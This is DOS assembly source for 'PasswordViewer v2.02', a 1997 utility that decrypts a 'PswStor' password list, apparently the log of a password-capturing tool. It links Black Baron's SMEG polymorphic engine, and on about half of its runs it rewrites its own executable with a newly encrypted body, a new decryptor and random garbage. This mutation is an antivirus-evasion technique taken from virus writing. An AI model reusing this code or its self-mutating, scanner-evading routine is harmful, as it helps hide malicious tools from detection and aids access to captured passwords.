model tiny
.code

extrn	smeg:near		;генератор smeg
extrn	encrypt:near		;процедура криптовки
extrn	smeg_bottom:near	;начало smeg
extrn	smeg_top:near		;конец smeg
extrn	generate_garbage:near	;генератор мусора

.startup
		call	$+3
		pop	si
		add	si,offsubmove-3
		mov	di,sp
		sub	di,800h
		mov	cx,lenmove
		push	di
		cld
		rep	movsb
		retn
offsubmove	equ	$-@startup
submove:	sub	si,offrun
		mov	di,100h
		lea	cx,smeg_top-100h
		rep	movsb
		lea	ax,normalrun
		push	ax
		retn
lenmove		equ	$-submove
offrun		equ	$-@startup
normalrun:	cmp	si,di
		je	secondcrypt
		mov	ah,34h
		int	21h
		mov	di,es:[bx+0fh]
		mov	ah,51h
		int	21h
		mov	ds,di
		mov	es,bx
		sub	di,bx
		mov	ax,es:[di+16h]
		mov	es,ax
		sub	ax,es:[di+16h]
		xchg	si,ax
		lodsw
		lea	si,secondcrypt[di]
		mov	cx,offset smeg_top-lensecond-100h
wordxor:	add	ax,0
secondmask	=	word ptr $-2
		xor	[si],al
		rol	ax,1
		inc	si
		loop	wordxor
lensecond	equ	$-@startup
secondcrypt:	push	cs
		pop	es
		lea	dx,copyright
		call	print
		lea	dx,myself24h
		mov	ax,2524h
		int	21h
		call	selfmutation
		lea	dx,helpme
		mov	di,81h
		mov	cl,[di-1]
		xor	ch,ch
		jcxz	print
		mov	al,' '
		repe	scasb
		jcxz	print
		inc	cx
		lea	si,[di-1]
		lea	di,filename
nextchar:	lodsb
		cmp	al,' '
		jbe	endchar
		stosb
		loop	nextchar
endchar:	push	di
		mov	ax,' '
		stosw
		mov	ax,'--'
		stosw
		mov	ax,'$ '
		stosw
		lea	dx,installfile
		call	strprint
		pop	di
		mov	[di],ch
		lea	dx,filename
		mov	ax,3d02h
		int	21h
		jc	printerror
		xchg	bx,ax
		mov	cx,sp
		sub	cx,dx
		sub	cx,1024
		mov	ah,3Fh
		int	21h
		jc	printerror
		mov	si,dx
		push	ax dx
		xchg	cx,ax
nextxor:	cmp	byte ptr [si],0
		jz	getnext
		ror	byte ptr [si],1
		xor	byte ptr [si],0aah
getnext:	inc	si
		loop	nextxor
		xchg	cx,ax
		call	lseek
		pop	dx cx
		mov	ah,40h
		int	21h
		lea	dx,okay
		jnc	close
printerror:	lea	dx,error
close:		mov	ah,3eh
		int	21h

print:		call	strprint
		lea	dx,crlf
strprint:	mov	ah,9
		int	21h
		retn

lseek:		xor	cx,cx
		mov	ah,42h
		cwd
		int	21h
		retn

myself24h:	mov	al,3
		iret

selfmutation:	xor	dl,dl
		mov	ax,3302h
		int	21h
		push	dx
		xor	ah,ah
		int	1Ah
		xchg	dx,ax
		mov	di,1
		and	ax,di
		jnz	exitmut
		mov	cx,[di+2ch-1]
		jcxz	exitmut
		mov	es,cx
nextfind:	dec	di
		scasw
		jnz	nextfind
		scasw
		push	es
		pop	ds
		mov	dx,di
		xchg	cx,ax
		mov	ax,4301h
		int	21h
		jc	exitmutdata
		mov	ax,3d01h
		int	21h
exitmutdata:	push	cs cs
		pop	es ds
		jc	exitmut
		xchg	bx,ax
		mov	ah,40h
		int	21h
		jc	cloself
		xor	ah,ah
		int	1Ah
		mov	secondmask,dx
		lea	si,@startup
		lea	di,smeg_top
		lea	cx,[di-100h]
		push	si cx di
		rep	movsb
		mov	bp,di
		lea	di,smeg_top+lensecond
		mov	cx,offset smeg_top-lensecond-100h
		mov	ax,20cdh
xorbyte:	add	ax,dx
		xor	[di],al
		rol	ax,1
		inc	di
		loop	xorbyte
		pop	dx cx ax
commoncrypt:	lea	di,[bp+2dh]	;рабочая область (2dh-длинa workbuffer'a)
		push	di
		call	smeg
		pop	dx
		mov	cx,[bp.decryptor_size]
		mov	ah,40h
		int	21h		;пишем декриптор
		push	dx
		call    encrypt		;шифруем код
		pop	dx
		mov	cx,[bp.datasize]
		mov	ah,40h
		int	21h		;пишем зашифрованный код
		call	generate_garbage
		mov	ah,40h
		int	21h		;пишем в конец мусор
cloself:	mov	ah,3eh
		int	21h
exitmut:	pop	dx
		mov	ax,3301h
		int	21h
		retn

copyright	db	0ah,'PasswordViewer / v2.02 (c) 1997 by Psychomancer aka Nice,SPS.'
crlf		db	0dh,0ah,'$'
helpme		db	'Usage: PswView pswlist',0dh,0ah
		db	'where:',0dh,0ah
		db	'pswlist - password storing phile of PswStor.',0dh,0ah,0ah
		db	'Example: PswView d:\list.crk -- password list phile List.Crk will b decrypted.',0dh,0ah
		db	'Pls c phile PswStor.doc 4 full information.',0dh,0ah,0ah
		db	'Special thanx 2 Black Baron 4 SMEG v0.3.',0dh,0ah
		db	'Send ur messages 2 me on: 2:454/5.9@FidoNet.$'
error		db	7,'I/O error.$'
okay		db	'decrypted ok.$'
installfile	db	'Decryption phile: '
filename	db	86h dup (0)

workbuffer	struc
datasize	dw	?	; 00 length of data to crypt
sourceptr	dw	?	; 02 pointer to data to crypt
targetptr	dw	?	; 04 pointer of where to put crypted data
		db	?	; 06 reg0 encryption value
		db	?	; 07 reg1 counter register
		db	?	; 08 reg2 temporary storage for data
				;	  to be decrypted
		db	?	; 09 reg3
		db	?	; 0A reg4 (always BP)
		db	?	; 0B reg5
		db	?	; 0C reg6
		db	?	; 0D reg7 pointer register
rng_buffer	dw	?	; 0E used by random number generator
cryptval	db	?	; 10 encryption value
ptr_offsets	dw	?	; 11 XXXX in [bx+XXXX] memory references
loop_top	dw	?	; 13 points to top of decryption loop
pointer_patch	dw	?	; 15 points to initialisation of pointer
counter_patch	dw	?	; 17 points to initialisation of counter
pointer_fixup	dw	?	; 19 needed for pointer calculation
crypt_type	db	?	; 1B how is it encrypted?
initialIP	dw	?	; 1C IP at start of decryptor
lastgarble	db	?	; 1E type of the last garbling instr
cJMP_patch	dw	?	; 1F conditional jmp patch
CALL_patch	dw	?	; 21 CALL patch
nJMP_patch	dw	?	; 23 near JMP patch
garbage_size	dw	?	; 25 # garbage bytes to append
decryptor_size	dw	?	; 27 size of decryptor
last_CALL	dw	?       ; 29 location of an old CALL patch location
which_tbl	dw	?	; 2B which table to use
workbuffer	ends

		end

